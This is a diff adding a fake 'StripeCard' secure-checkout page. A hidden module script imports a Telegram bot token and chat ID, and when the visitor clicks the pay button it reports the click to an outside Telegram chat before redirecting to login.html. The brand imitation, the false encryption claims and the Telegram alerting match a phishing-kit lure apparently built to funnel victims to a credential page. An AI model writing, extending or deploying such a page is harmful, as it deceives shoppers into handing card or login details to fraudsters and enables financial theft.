@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Payment</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script type="module" src="config.js"></script>
+</head>
+
+<body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+
+<div class="w-full max-w-md">
+
+<div class="bg-white rounded-2xl shadow-xl overflow-hidden">
+
+<!-- Header -->
+<div class="relative h-56">
+<img 
+src="https://images.unsplash.com/photo-1556742400-b5c7c5127c52?w=800&h=400&fit=crop"
+class="w-full h-full object-cover"
+/>
+
+<div class="absolute inset-0 bg-black/30"></div>
+
+<h1 class="absolute bottom-6 left-6 text-white text-3xl font-bold tracking-wide">
+SECURE CHECKOUT
+</h1>
+</div>
+
+<!-- Content -->
+<div class="p-6 md:p-8">
+
+<div class="flex items-center gap-4 mb-6">
+
+<!-- Payment Icon -->
+<div class="w-16 h-16 bg-indigo-500 rounded-xl flex items-center justify-center">
+
+<svg xmlns="http://www.w3.org/2000/svg"
+class="w-8 h-8 text-white"
+fill="none"
+viewBox="0 0 24 24"
+stroke="currentColor">
+
+<rect x="2" y="5" width="20" height="14" rx="2" stroke-width="2"/>
+<line x1="2" y1="10" x2="22" y2="10" stroke-width="2"/>
+
+</svg>
+
+</div>
+
+<div>
+<h2 class="text-2xl font-bold text-gray-800">Card Payment</h2>
+<p class="text-gray-500 mt-1">Secure payment gateway</p>
+</div>
+
+</div>
+
+<p class="text-gray-700 leading-relaxed mb-8">
+Complete your payment securely using your debit or credit card. 
+All transactions are encrypted and protected.
+</p>
+
+<a href="login.html" id="pay-btn"
+class="block w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold text-lg py-4 rounded-2xl transition shadow-lg hover:shadow-xl flex items-center justify-center gap-3 cursor-pointer">
+
+<!-- Credit Card Icon -->
+
+<svg xmlns="http://www.w3.org/2000/svg"
+class="w-6 h-6"
+fill="none"
+viewBox="0 0 24 24"
+stroke="currentColor">
+
+<rect x="2" y="5" width="20" height="14" rx="2" stroke="white" stroke-width="2"/>
+<line x1="2" y1="10" x2="22" y2="10" stroke="white" stroke-width="2"/>
+
+</svg>
+
+Pay with Card
+
+</a>
+
+</div>
+</div>
+
+<p class="text-center text-gray-400 text-sm mt-6">
+© 2026 StripeCard
+</p>
+
+</div>
+
+<script type="module">
+import { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } from './config.js';
+
+document.addEventListener('DOMContentLoaded', () => {
+
+const btn = document.getElementById('pay-btn');
+
+if (!btn || !TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+console.warn('Telegram config missing or button not found');
+return;
+}
+
+btn.addEventListener('click', async (e) => {
+
+e.preventDefault();
+
+const message = "CARD PAYMENT PAGE OPENED 💳";
+
+try {
+
+await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+
+body: JSON.stringify({
+chat_id: TELEGRAM_CHAT_ID,
+text: message
+})
+
+});
+
+window.location.href = btn.href;
+
+} catch (err) {
+
+console.error('Telegram send failed:', err);
+window.location.href = btn.href;
+
+}
+
+});
+
+});
+</script>
+
+</body>
+</html>
